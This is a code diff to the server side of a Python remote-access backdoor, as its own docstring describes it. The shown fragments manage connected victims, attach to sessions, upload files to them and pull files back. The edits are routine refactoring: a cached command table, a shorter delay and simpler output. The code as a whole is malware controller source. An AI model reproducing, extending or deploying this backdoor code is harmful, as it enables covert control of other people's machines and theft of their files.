@@ -17,6 +17,7 @@ from rich.table import Table
 from rich.box import SIMPLE
 from os import system, uname
 
+
 class Server(object):
     """ server side backdoor """
     def __init__(self, host='0.0.0.0', port=5000):
@@ -24,6 +25,7 @@ class Server(object):
         self.connectedUsers = {}
         self.userAttached = self.userCwd = ''
         self.especialCommands = {'clear': self.clearScreen, 'cls': self.clearScreen, 'exit': self.closeTerminal}
+        self.allCommands = self.setAllCommands()
 
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
@@ -251,14 +253,11 @@ class Server(object):
                     
                     namefile, extension, file = self.splitFile(args)
                     self.sendHeader(connection, {"namefile": namefile, "extension": extension, "bytes": len(file)})    
-                    sleep(1)
+                    sleep(0.5)
                     connection.send(file)
 
                     response = self.receiveHeader(connection)
-                    if response['sucess']:
-                        printr(f"[green]{response['content']}")
-                    else:
-                        printr(f"[red]{response['content']}")
+                    printr(response['content'])
                 else:
                     printr(f'[red] File {args} not found.')
             except PermissionError:
@@ -276,7 +275,7 @@ class Server(object):
                 if header["sucess"]:
                     self.receiveFile(connection, header)
                 else:
-                    printr(f'[red]{header["content"]}')
+                    printr(header['content'])
             except EOFError:
                 printr(f'[red] Connection with [yellow]{self.userAttached}[red] was lost.')
                 self.removecurrentSession() # removing the current session because connection probaly was lost
@@ -387,14 +386,14 @@ class Server(object):
 
     # showing the available commands to use
     def availableCommands(self, args):
-        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() ))
+        printr(''.join(f'  {command}\n' for command in self.allCommands.keys() ))
 
     # showing only the internal commands
     def internalcommands(self, args):
-        printr(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))
+        printr(''.join(f'  {command}\n' for command in self.allCommands.keys() if self.allCommands[command]['local']))
 
     # return all defined commands of program | setting a new command, name, your action, features...
-    def allCommands(self):
+    def setAllCommands(self):
         commands = {
             "/attach": {"local": True, "action": self.attach},
             "/detach": {"local": True, "action": self.detach},
@@ -424,9 +423,9 @@ class Server(object):
 
     # returns function of the command (your action) and your respective arguments, if exists, if not returns False.
     def splitCommand(self, command):
-        if self.allCommands().get(command.split()[0]):
+        if self.allCommands.get(command.split()[0]):
             # 0: function, 1: args | example: /attach znairy = self.attach, 'znairy'
-            return self.allCommands()[command.split()[0]]["action"], ''.join(f'{cmd} ' for cmd in command.split()[1:])
+            return self.allCommands[command.split()[0]]["action"], ''.join(f'{cmd} ' for cmd in command.split()[1:])
 
         return False, '' # command does not exist
 
